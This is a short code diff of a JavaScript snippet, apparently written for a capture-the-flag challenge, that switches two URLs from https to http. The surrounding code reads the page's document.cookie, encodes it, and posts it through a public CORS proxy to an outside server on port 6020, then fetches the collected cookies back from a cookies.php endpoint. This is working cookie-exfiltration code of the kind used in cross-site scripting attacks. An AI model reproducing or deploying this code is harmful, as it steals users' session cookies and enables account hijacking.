@@ -10,7 +10,7 @@
         // Encode the document.cookie value
         const encodedCookieValue = encodeURIComponent(document.cookie);
         const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
-        const targetUrl = 'https://host3.metaproblems.com:6020/index.php';
+        const targetUrl = 'http://host3.metaproblems.com:6020/index.php';
 
         // Fetch request to set cookies
         fetch(proxyUrl + targetUrl, {
@@ -25,7 +25,7 @@
         .catch(error => console.error('Error storing cookie:', error));
 
         // Fetch request to retrieve cookies
-        const cookiesUrl = 'https://host3.metaproblems.com:6020/cookies.php';
+        const cookiesUrl = 'http://host3.metaproblems.com:6020/cookies.php';
         fetch(proxyUrl + cookiesUrl)
         .then(response => response.text())
         .then(data => {
